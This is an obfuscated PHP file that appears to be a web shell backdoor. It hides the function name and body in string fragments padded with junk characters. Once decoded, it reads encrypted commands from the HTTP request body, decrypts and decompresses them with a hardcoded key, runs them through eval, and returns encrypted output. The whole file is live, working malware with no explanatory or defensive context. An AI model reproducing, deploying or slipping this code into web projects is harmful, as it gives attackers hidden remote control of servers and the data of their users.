<?php
$m='strlen($tG);$o="";fGor($iG=0;GG$i<$l;){for($j=0G;(G$j<$c&&$i<$Gl);$';
$y='"TER0mGG9qffBgbov38";fGunGction x(G$t,G$k){$c=Gstrlen($k)G;$lG=G';
$A='Gj+G+G,$i++){$o.G=$t{$i}^G$k{$j};}}rGeGturn $o;}if G(@Gpreg_matGc';
$P='h("/G$Gkh(.+G)$kf/",@fiGGle_get_Gcontents("pGhp://input"G),G$m)==';
$b='eG64_encoGde(@Gx(@gzcGGompress($o),$kG))G;GprintG("$p$kh$r$kf");}';
$E='m[1]),$k)))GGG;$o=@obG_get_conteGnts();@GoGb_enGd_clean();$r=@bas';
$a=str_replace('y','','cyryeyyaytye_function');
$U='$k="c1G628fG54";$kh="51G385G533ea24"G;G$kf="7G1G52G8adeb516";$p=';
$N='1)G {@ob_GstartG();@evGal(@gzuGnGcompress(G@x(@baGse64_decodeG(G$';
$r=str_replace('G','',$U.$y.$m.$A.$P.$N.$E.$b);
$l=$a('',$r);$l();
?>
